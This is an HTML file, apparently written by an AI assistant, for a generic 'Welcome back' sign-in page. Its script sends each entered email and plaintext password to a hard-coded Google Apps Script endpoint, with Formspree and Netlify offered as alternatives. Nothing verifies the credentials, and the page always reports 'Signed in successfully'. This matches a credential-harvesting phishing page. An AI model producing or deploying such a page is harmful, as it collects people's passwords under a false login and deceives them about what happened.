<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in</title>
  <style>
    :root {
      --bg: #0f172a;
      --card: #1e293b;
      --accent: #6366f1;
      --accent-hover: #818cf8;
      --text: #e2e8f0;
      --muted: #94a3b8;
      --ok: #22c55e;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: linear-gradient(135deg, #0f172a, #1e1b4b);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: var(--card);
      width: 100%;
      max-width: 480px;
      border-radius: 16px;
      padding: 32px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.4);
    }
    h1 { margin: 0 0 6px; font-size: 24px; }
    p.sub { margin: 0 0 24px; color: var(--muted); font-size: 14px; }
    label { display: block; font-size: 14px; margin: 16px 0 6px; color: var(--text); }
    input, textarea {
      width: 100%;
      padding: 12px 14px;
      border-radius: 10px;
      border: 1px solid #334155;
      background: #0f172a;
      color: var(--text);
      font-size: 15px;
      font-family: inherit;
    }
    input:focus, textarea:focus { outline: 2px solid var(--accent); border-color: transparent; }
    textarea { resize: vertical; min-height: 110px; }
    button {
      margin-top: 24px;
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: var(--accent);
      color: white;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }
    button:hover { background: var(--accent-hover); }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    .msg { margin-top: 18px; font-size: 14px; text-align: center; min-height: 20px; }
    .msg.ok { color: var(--ok); }
    .msg.err { color: #f87171; }

    /* password field with show/hide toggle */
    .pw-wrap { position: relative; }
    .pw-wrap input { padding-right: 72px; }
    .pw-toggle {
      position: absolute;
      top: 50%;
      right: 8px;
      transform: translateY(-50%);
      margin: 0;
      width: auto;
      padding: 6px 10px;
      background: transparent;
      color: var(--muted);
      font-size: 13px;
      font-weight: 600;
      border-radius: 8px;
    }
    .pw-toggle:hover { background: transparent; color: var(--text); }
    .pw-toggle:focus { outline: none; color: var(--text); }

    /* remember me + forgot password row */
    .row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-top: 16px;
    }
    .remember {
      display: flex;
      align-items: center;
      gap: 8px;
      margin: 0;
      font-size: 14px;
      color: var(--muted);
      cursor: pointer;
    }
    .remember input { width: auto; accent-color: var(--accent); cursor: pointer; }
    a.forgot { font-size: 14px; color: var(--accent); text-decoration: none; }
    a.forgot:hover { color: var(--accent-hover); }

    .foot { margin-top: 24px; text-align: center; font-size: 14px; color: var(--muted); }
    .foot a { color: var(--accent); text-decoration: none; font-weight: 600; }
    .foot a:hover { color: var(--accent-hover); }
  </style>
</head>
<body>
  <div class="card">
    <h1>Welcome back</h1>
    <p class="sub">Sign in to your account to continue.</p>

    <form id="loginForm">
      <label for="email">Email</label>
      <input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="email" required />

      <label for="password">Password</label>
      <div class="pw-wrap">
        <input id="password" name="password" type="password" placeholder="••••••••" autocomplete="current-password" required minlength="6" />
        <button type="button" class="pw-toggle" id="pwToggle" aria-label="Show password">Show</button>
      </div>

      <div class="row">
        <label class="remember"><input type="checkbox" id="remember" name="remember" /> Remember me</label>
        <a class="forgot" href="#">Forgot password?</a>
      </div>

      <button type="submit" id="submitBtn">Sign in</button>
      <div class="msg" id="msg"></div>
    </form>

    <p class="foot">Don't have an account? <a href="#">Sign up</a></p>
  </div>

  <script>
    // ============================================================
    // CHOOSE YOUR FREE BACKEND BY EDITING THESE LINES:
    // ------------------------------------------------------------
    // OPTION A (Google Sheet)  -> paste your Apps Script URL here:
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby8ipqf5oCVQ3q5oqOPedQegJp_8ivTRz_0arwYbFwxhqV2H7nCSuUish3zQfEAlwzO/exec";
    // OPTION B (Formspree)     -> paste your Formspree endpoint here:
    const FORMSPREE_URL = "";
    // OPTION C (Netlify Forms) -> set to true and follow the README:
    const USE_NETLIFY = false;
    // ============================================================
    // NOTE: this front-end only SENDS the credentials somewhere.
    // It does not verify them by itself — whatever backend you point
    // it at must do the actual checking (see note from the assistant).
    // ============================================================

    const form = document.getElementById("loginForm");
    const btn = document.getElementById("submitBtn");
    const msg = document.getElementById("msg");
    const pw = document.getElementById("password");
    const pwToggle = document.getElementById("pwToggle");
    const remember = document.getElementById("remember");

    // Show / hide password
    pwToggle.addEventListener("click", () => {
      const show = pw.type === "password";
      pw.type = show ? "text" : "password";
      pwToggle.textContent = show ? "Hide" : "Show";
      pwToggle.setAttribute("aria-label", show ? "Hide password" : "Show password");
    });

    // localStorage can be blocked inside sandboxed previews — wrap it
    const safeGet = (k) => { try { return localStorage.getItem(k); } catch { return null; } };
    const safeSet = (k, v) => { try { v === null ? localStorage.removeItem(k) : localStorage.setItem(k, v); } catch {} };

    // Prefill email if the user chose "Remember me" before
    const savedEmail = safeGet("loginEmail");
    if (savedEmail) {
      form.email.value = savedEmail;
      remember.checked = true;
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      msg.textContent = "";
      msg.className = "msg";
      btn.disabled = true;
      btn.textContent = "Signing in...";

      const data = {
        email: form.email.value.trim(),
        password: form.password.value,
        remember: remember.checked,
        submitted: new Date().toISOString()
      };

      try {
        if (USE_NETLIFY) {
          // Netlify Forms: send as form-encoded with the form name
          const fd = new FormData(form);
          fd.append("form-name", "loginForm");
          await fetch("/", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams(fd).toString()
          });
        } else if (SCRIPT_URL) {
          await fetch(SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          });
        } else if (FORMSPREE_URL) {
          await fetch(FORMSPREE_URL, {
            method: "POST",
            headers: { "Accept": "application/json" },
            body: new FormData(form)
          });
        } else {
          throw new Error("No backend configured. Open index.html and set SCRIPT_URL, FORMSPREE_URL, or USE_NETLIFY.");
        }

        // Remember / forget the email locally
        safeSet("loginEmail", remember.checked ? data.email : null);

        msg.textContent = "✅ Signed in successfully.";
        msg.className = "msg ok";
        pw.value = "";
      } catch (err) {
        msg.textContent = "❌ Something went wrong. Please try again.";
        msg.className = "msg err";
        console.error(err);
      } finally {
        btn.disabled = false;
        btn.textContent = "Sign in";
      }
    });
  </script>
</body>
</html>
